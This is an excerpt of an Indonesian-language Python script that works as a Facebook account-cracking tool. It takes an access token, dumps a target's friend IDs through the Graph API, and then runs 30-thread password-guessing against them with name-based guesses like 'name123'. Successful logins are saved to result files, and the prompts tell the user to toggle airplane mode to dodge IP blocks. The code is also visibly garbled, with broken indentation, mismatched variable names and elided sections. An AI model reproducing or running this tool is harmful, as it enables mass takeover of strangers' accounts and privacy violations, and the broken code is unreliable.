...
# MASUK TOKEN (TOKEN FACEBOK SAYANG)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s [01] Login via token \n [02] SUBSCRIBE AKUN GUA \n [%s00%s] Keluar'%(P,M,P))
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
        print("%s [!] Isi yang benar sayang "%(M));exit()
elif rom in ('1','01'):
        jalan("\n%s [%s!%s]  gunakan akun ke dua ya sayang "%(P,M,P)) 
        SadBoy = raw_input('%s [?] Token : %s'%(P,K)) 
        if SadBoy in(""):
                print("%s [!] Isi yang benar sayang "%(M));exit() 	
        try:
           gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(SadBoy)).json()['name'] 
           print ('\n%s[√] Login berhasil, mohon tunggu sayang'%(H));jeda(2) 
           open('token.txt', 'w').write(Sadboy);login_xx() 
    ...
    print ("\n%s%s i love you sayang:"%(H,til));jeda(2) 
    print (" - ara ara(aku cinta kamu sayang)");jeda(2) 
    print ("\n%s [!] saya sunggu sayang kamu "%(M));jeda(2);os.system("i love you");masuk()
elif rom in ('0', '00'):
    exit('\n')
else:
    print("%s [!] Isi yang benar sayang "%(M));exit()
...
def publik(romz,headers=header):
    ...
    try:
        print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri sayang"%(P,M,P,H,P)) 
        idt = raw_input(' [*] Target id : %s'%(K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,Sadboy)) 
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_') 
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,Sadboy)) 
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] sedang mengumpulkan id sayang :%s %s ' % (P,H,str(len(id))), 
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Sukses dump id sayang dari %s%s'%(P,H,P,H,nm['name'])) 
        print ('%s [%s√%s] File dump tersimpan sayang :%s %s '%(P,H,P,H,file)) 
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
    except Exception as e:
        exit('\n %s[!] gagal dump id sayang'%(P))
# START CRACK
class sayang:
    ...
    def romiy(self):
        try:
            ...
            print '\n%s [!] File dump tidak ada sayang, dump id dulu sayang'%(M) 
            ...
            if unikers in ('Y', 'y'):
               ...
               while True:
                   ...
                   if pwx == '':
                      print '\n %s[!] jangan kosong sayang '%(M) 
                   elif len(pwx)<=5:
                       print '\n %s[!] password minimal 6 karakter sayang'%(M) 
                   else:
                      def zona(Sadboy_=None):     ind = raw_input('\n %s[?] methode : %s'%(P,K)) 
                          if ind == '':
                             print("%s [!] Isi yang benar sayang "%(M));self.zona() 
                          elif ind in ('1', '01'):
                              ...
                              print '%s [%s!%s] setiap crack 2k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2) 
                              with ThreadPoolExecutor(max_workers=30) as log:
                                  for akun in self.id:
                                      try:
                                          indo = akun.split('<=>')[0]
                                          log.submit(self.b_api, indo, Sadboy_)
                                      except: pass
            os.remove(self.apk);exit()
             ...
             with ThreadPoolExecutor(max_workers=30) as log:
                 for akun in self.id:
                     try:
                         indo = akun.split('<=>')[0]
                         log.submit(self.mobil, indo, SadBoy_)
                     except: pass
             os.remove(self.apk);exit()
         else:
             print ('\n %s[!] isi yang benar sayang'%(M));zona() 
             print '\n%s [ pilih methode ngecrack - silahkan coba satu-satu sayang ]\n'%(P) 
             print ' [%s01%s] methode b-api (crack cepat sayang)'%(K,P) 
             print ' [%s02%s] methode mbasic (crack lambat sayang)'%(K,P)
             print ' [%s03%s] methode mobile (crack sangat lambat sayang) '%(K,P) 
             zona(pwx.split(','))
             break
 elif unikers in ('T', 't'):
    print '\n%s [ pilih methode crack - silahkan coba satu-satu sayang ]\n'%(P) 
    print ' [%s01%s] methode b-api (crack cepat sayang)'%(K,P) 
    print ' [%s02%s] methode mbasic (crack lambat sayang)'%(K,P) 
    print ' [%s03%s] methode mobile (crack sangat lambat sayang) '%(K,P) 
    self.langsung()
else:
    print("%s [!] Isi yang benar sayang "%(M));jeda(2);menu() 
def langsung(self):
    suuu = raw_input('\n %s[?] methode :%s '%(P,K)) 
    if suuu == '':
        print("%s [!] Isi yang benar sayang "%(M));self.langsung() 
    elif suuu in ('1', '01'):
         print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2) 
         print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2) 
         print '%s [%s!%s] setiap crack 2k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2) 
                 ...
                 try:
                     ...
                     if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6: 
                        pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                          ...
                          pwx = [name, _i_[0]+"123", _i_[0]+"12345"] log.submit(self.b_api, uid, pwx)
                  except: pass
          os.remove(self.apk);exit()
elif suuu in ('2', '02'):
    print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2) 
   ...
   os.remove(self.apk);exit()
    ...
    with ThreadPoolExecutor(max_workers=30) as log:
     ...
     print("\n%s [!] Isi yang benar sayang "%(M));self.langsung() 
...
for pw in zona:
    ...
    if response.status_code != 200:
        loop +=1
        print ("\r\033[0;91m [!] IP terblokir sayang . hidupkan mode pesawat 2 detik"), 
        sys.stdout.flush()
...
def crack2(user, pwx):
        ...
        for pas in pwx:
                ...
                pw = pas.lower()
                try:   
                        headerz = {"User-Agent": user_agentz_api}			pass
...
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K)) 
    if u == '':
       print("%s [!] Isi yang benar sayang "%(M));jeda(2);uas()
   elif u in("1","01"):
      print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sayang"%(P,K,P,H,P,K,P)) 
...
def menu():
    os.system('clear')
    try:
        Sadboy = open('token.txt', 'r').read() 
    except IOError:
        print ("%s [!] Token invalid sayang "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header) 
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid sayang "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P)) 
    print (' [%s01%s] Dump id public'%(K,P)) 
    print (' [%s02%s] %sStart crack %s'%(K,P,H,P)) 
    print (' [%s03%s] Cek hasil crack'%(K,P)) 
...
def hasill(c):
        if c in[""]:
                print ("%s[%s!%s] isi yang benar sayang"%(P,M,P));exit()
        elif c in["1","01"]:
                try:
 ...
 while True:
         ...
         if rom in['1','01']:
             ...
             exit()
def igg():
        print ("\n%s [%s!%s] Cth nama %s: %Sadboy "%(P,M,P,M,K))	
